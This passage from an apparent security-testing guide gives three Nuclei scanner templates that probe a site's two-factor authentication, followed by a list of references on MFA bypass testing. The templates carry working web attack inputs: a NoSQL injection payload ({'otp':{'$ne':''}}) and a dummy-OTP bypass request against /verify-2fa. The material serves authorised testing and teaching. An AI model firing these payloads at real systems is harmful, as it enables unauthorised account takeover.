  ```yaml [2fa-bypass-checks.yaml]
  id: 2fa-response-manipulation

  info:
    name: 2FA Response Manipulation Check
    author: security-researcher
    severity: high
    description: Checks if 2FA can be bypassed via response manipulation
    tags: 2fa,bypass,mfa,otp

  http:
    - raw:
        - |
          POST /verify-2fa HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/json
          Cookie: session={{session}}

          {"otp":"000000"}

      matchers-condition: or
      matchers:
        - type: word
          words:
            - '"success":true'
            - '"verified":true'
            - '"valid":true'
          condition: or

        - type: status
          status:
            - 200
            - 302

  ---

  id: 2fa-otp-in-response

  info:
    name: OTP Leaked in Response
    author: security-researcher
    severity: critical
    description: Checks if OTP code is leaked in server response
    tags: 2fa,otp,leak,information-disclosure

  http:
    - raw:
        - |
          POST /api/send-otp HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/json
          Cookie: session={{session}}

          {"email":"{{email}}"}

      matchers:
        - type: regex
          regex:
            - '"otp"\s*:\s*"\d{4,8}"'
            - '"code"\s*:\s*"\d{4,8}"'
            - '"verification_code"\s*:\s*"\d{4,8}"'
            - '"token"\s*:\s*"\d{4,8}"'
            - '"pin"\s*:\s*"\d{4,8}"'

  ---

  id: 2fa-nosql-injection

  info:
    name: 2FA NoSQL Injection Bypass
    author: security-researcher
    severity: critical
    description: Checks if 2FA OTP field is vulnerable to NoSQL injection
    tags: 2fa,nosql,injection,bypass

  http:
    - raw:
        - |
          POST /verify-2fa HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/json
          Cookie: session={{session}}

          {"otp":{"$ne":""}}

      matchers-condition: and
      matchers:
        - type: word
          words:
            - "success"
            - "verified"
            - "dashboard"
          condition: or

        - type: status
          status:
            - 200
            - 302
  ```
  ::
  :::
::

---

## References & Resources

::card-group
  ::card
  ---
  title: HackTricks - 2FA Bypass
  icon: i-lucide-book-open
  to: https://book.hacktricks.wiki/en/pentesting-web/2fa-bypass.html
  target: _blank
  ---
  Comprehensive 2FA bypass techniques including response manipulation, brute force, direct navigation, and token manipulation attacks.
  ::

  ::card
  ---
  title: PayloadsAllTheThings - 2FA Bypass
  icon: i-simple-icons-github
  to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/MFA%20Bypass
  target: _blank
  ---
  Curated collection of MFA bypass payloads, techniques, and real-world exploitation methods from the PayloadsAllTheThings repository.
  ::

  ::card
  ---
  title: OWASP Testing Guide - 2FA
  icon: i-lucide-shield-check
  to: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication
  target: _blank
  ---
  OWASP's official testing methodology for Multi-Factor Authentication covering all aspects of 2FA security testing.
  ::

  ::card
  ---
  title: PortSwigger - 2FA Bypass Labs
  icon: i-lucide-graduation-cap
  to: https://portswigger.net/web-security/authentication/multi-factor
  target: _blank
  ---
  Interactive hands-on labs for practicing 2FA bypass techniques including brute force, flawed logic, and verification bypass.
  ::

  ::card
  ---
  title: Bug Bounty 2FA Bypass Reports
  icon: i-lucide-bug
  to: https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPAUTH.md
  target: _blank
  ---
  Collection of real-world HackerOne bug bounty reports involving 2FA/MFA bypass vulnerabilities with full details and payouts.
  ::

  ::card
  ---
  title: Bugcrowd University - Auth Bypass
  icon: i-lucide-school
  to: https://www.bugcrowd.com/resources/levelup/
  target: _blank
  ---
  Bugcrowd's educational resources on authentication bypass including 2FA, MFA, and OTP testing methodologies.
  ::

  ::card
  ---
  title: NahamSec - 2FA Bypass Techniques
  icon: i-lucide-video
  to: https://www.youtube.com/@NahamSec
  target: _blank
  ---
  Video tutorials and live hacking streams demonstrating real-world 2FA bypass discoveries in bug bounty programs.
  ::

  ::card
  ---
  title: Nuclei MFA Templates
  icon: i-simple-icons-github
  to: https://github.com/projectdiscovery/nuclei-templates
  target: _blank
  ---
  Community-maintained nuclei templates for automated detection of 2FA/MFA implementation flaws and bypass opportunities.
  ::

  ::card
  ---
  title: Burp Suite 2FA Testing
  icon: i-lucide-wrench
  to: https://portswigger.net/burp/documentation/desktop/testing-workflow/authentication
  target: _blank
  ---
  Official Burp Suite documentation on testing authentication mechanisms including intercepting and manipulating 2FA flows.
  ::

  ::card
  ---
  title: 2FA.fail - Known Bypass Database
  icon: i-lucide-database
  to: https://infosec.exchange/tags/2fa
  target: _blank
  ---
  Community-aggregated database of known 2FA implementation flaws and bypass techniques across popular platforms.
  ::

  ::card
  ---
  title: NIST SP 800-63B - Authentication Guidelines
  icon: i-lucide-file-text
  to: https://pages.nist.gov/800-63-3/sp800-63b.html
  target: _blank
  ---
  NIST's official guidelines on digital identity authentication including MFA requirements, OTP standards, and security recommendations.
  ::

  ::card
  ---
  title: Alex Birsan - 2FA Research
  icon: i-lucide-flask-conical
  to: https://medium.com/@alex.birsan
  target: _blank
  ---
  Security research publications on authentication bypass techniques including novel 2FA exploitation methods.
  ::
::